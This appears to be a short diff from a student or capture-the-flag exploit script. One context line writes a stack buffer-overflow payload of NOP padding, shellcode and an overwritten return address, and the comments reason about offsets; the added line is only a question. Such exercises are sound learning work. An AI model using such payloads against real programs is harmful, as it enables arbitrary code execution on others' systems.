@@ -12,3 +12,5 @@ sys.stdout.buffer.write(b'0x90' + (0x70-56)*b'A'+shellcode+(8*b'A')+(0x7ffffff6d
 # aren't subtracting 54 bc we have 2 byte noop --> subtracting 56
 # need to add code so that no matter how the stack organizes itself, I am always returning the entire shellcode
 # writing to the address of the shellcode
+
+# should there be a while loop to wait for a certain symbol?
